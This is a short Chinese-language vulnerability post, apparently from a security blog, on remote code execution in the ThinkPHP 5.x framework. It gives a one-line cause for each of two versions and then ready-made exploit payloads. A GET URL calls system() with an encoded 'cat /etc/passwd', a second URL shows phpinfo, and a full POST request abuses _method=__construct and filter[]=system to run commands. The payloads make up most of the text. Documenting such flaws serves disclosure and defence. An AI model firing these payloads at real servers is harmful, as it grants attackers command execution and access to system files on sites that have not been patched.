---
title: "ThinkPHP 5.x 远程代码执行"
author: ["4shen0ne"]
lastmod: 2024-12-14T01:39:06+08:00
tags: ["vuln"]
draft: false
---

## version 5.0.22/5.1.29 {#version-5-dot-0-dot-22-5-dot-1-dot-29}

由于框架对控制器名没有进行足够的检测，导致在没有开启强制路由的情况下（即默认情况）
可以执行任意方法，造成 RCE 漏洞。

利用 system 函数执行命令：

```nil
http://localhost:8080/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=%63%61%74%20%2f%65%74%63%2f%70%61%73%73%77%64
```

{{< figure src="/ox-hugo/2020-12-19_23-26-20_snipaste_2019-08-08_13-38-12.png" >}}

显示 phpinfo 页面：

```nil
http://localhost:8080/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
```


## 5.0.23 {#5-dot-0-dot-23}

在获取 method 的方法中没有正确处理方法名，导致攻击者可以调用 Request 类任意方法
并构造利用链，造成 RCE 漏洞。

```nil
POST /index.php?s=captcha HTTP/1.1
Host: localhost:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: TUw_sid=4N3wkZ; TUw_visitedfid=2
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 85

_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=cat /etc/passwd
```

[相关代码](https://github.com/top-think/framework/commit/4a4b5e64fa4c46f851b4004005bff5f3196de003)
